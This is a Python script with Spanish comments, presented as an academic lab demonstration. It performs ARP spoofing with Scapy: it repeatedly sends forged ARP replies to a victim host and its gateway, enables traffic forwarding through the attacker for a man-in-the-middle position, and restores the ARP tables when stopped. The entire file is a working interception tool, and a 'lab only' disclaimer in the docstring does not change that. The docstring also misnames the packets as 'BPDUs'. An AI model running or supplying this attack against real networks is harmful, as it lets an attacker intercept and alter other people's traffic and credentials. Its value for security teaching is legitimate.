#!/usr/bin/env python3
"""
arp_mitm.py
-----------
Demostracion academica de un ataque Man-in-the-Middle (MitM) mediante
ARP Spoofing / ARP Poisoning. USO EXCLUSIVO EN LABORATORIO PROPIO.

Objetivo del script:
    Envenenar las tablas ARP de dos hosts (o de un host y el gateway) para
    que todo el trafico entre ellos atraviese el equipo atacante, permitiendo
    su intercepcion y/o manipulacion.

Parametros usados (variables de configuracion mas abajo):
    VICTIM_A : IP de la primera victima.
    VICTIM_B : IP de la segunda victima (o gateway).
    IFACE    : Interfaz de red del atacante.
    INTERVAL : Segundos entre cada reenvio de BPDUs ARP falsificadas.

Requisitos:
    - Linux con privilegios de root (sudo).
    - Python 3.8+
    - Scapy:  pip install scapy
    - IP forwarding habilitado para reenviar el trafico:
          sudo sysctl -w net.ipv4.ip_forward=1
    - Las tres maquinas en el mismo dominio de broadcast (misma VLAN/LAN).

Ejecucion:
    sudo python3 arp_mitm.py
    Ctrl+C para detener y restaurar las tablas ARP legitimas.
"""

import sys
import time
from scapy.all import ARP, Ether, send, srp

# ------------------- CONFIGURACION (ajustar al laboratorio) -------------------
VICTIM_A = "20.23.3.20"     # Host victima 1 (VLAN 10 - Ventas)
VICTIM_B = "20.23.3.1"      # Gateway de la VLAN 10 (router)
IFACE    = "eth0"           # Interfaz del atacante
INTERVAL = 2                # Segundos entre reenvios
# ------------------------------------------------------------------------------


def get_mac(ip):
    """Resuelve la MAC de una IP enviando una solicitud ARP por broadcast."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2, iface=IFACE, verbose=0,
    )
    for _, resp in ans:
        return resp.hwsrc
    return None


def spoof(target_ip, target_mac, spoof_ip):
    """
    Envia una respuesta ARP no solicitada (op=2) diciendole a target_ip
    que spoof_ip se encuentra en la MAC del atacante (la de IFACE).
    """
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=IFACE, verbose=0)


def restore(ip1, mac1, ip2, mac2):
    """Repara las tablas ARP de ambas victimas con la informacion correcta."""
    send(ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2),
         count=5, iface=IFACE, verbose=0)
    send(ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1),
         count=5, iface=IFACE, verbose=0)


def main():
    print("[*] Resolviendo direcciones MAC de las victimas...")
    mac_a = get_mac(VICTIM_A)
    mac_b = get_mac(VICTIM_B)

    if not mac_a or not mac_b:
        print("[!] No se pudieron resolver las MAC. Verifica conectividad/VLAN.")
        sys.exit(1)

    print(f"[+] Victima A  {VICTIM_A}  ->  {mac_a}")
    print(f"[+] Victima B  {VICTIM_B}  ->  {mac_b}")
    print("[*] Verifica que el IP forwarding este activo:")
    print("    sudo sysctl -w net.ipv4.ip_forward=1")
    print("[*] Envenenando cache ARP... (Ctrl+C para detener y restaurar)")

    sent = 0
    try:
        while True:
            spoof(VICTIM_A, mac_a, VICTIM_B)   # A cree que el atacante es B
            spoof(VICTIM_B, mac_b, VICTIM_A)   # B cree que el atacante es A
            sent += 2
            print(f"\r[+] Paquetes ARP enviados: {sent}", end="")
            time.sleep(INTERVAL)
    except KeyboardInterrupt:
        print("\n[*] Restaurando tablas ARP legitimas...")
        restore(VICTIM_A, mac_a, VICTIM_B, mac_b)
        print("[+] Tablas restauradas. Ataque finalizado.")


if __name__ == "__main__":
    main()
